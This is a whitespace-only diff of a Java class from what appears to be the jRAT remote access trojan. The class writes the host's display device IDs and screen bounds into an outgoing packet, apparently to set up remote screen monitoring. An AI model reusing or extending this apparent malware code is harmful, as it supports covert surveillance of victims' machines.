@@ -6,11 +6,10 @@ import java.io.DataOutputStream;
 
 import pro.jrat.common.io.StringWriter;
 
-
 public class Packet61InitMonitors extends AbstractOutgoingPacket {
-	
+
 	private GraphicsDevice[] graphicsDevices;
-	
+
 	public Packet61InitMonitors(GraphicsDevice[] graphicsDevices) {
 		this.graphicsDevices = graphicsDevices;
 	}
@@ -18,7 +17,7 @@ public class Packet61InitMonitors extends AbstractOutgoingPacket {
 	@Override
 	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
 		dos.writeInt(graphicsDevices.length);
-		
+
 		for (GraphicsDevice device : graphicsDevices) {
 			Rectangle screenBounds = device.getDefaultConfiguration().getBounds();
 			String id = device.getIDstring();
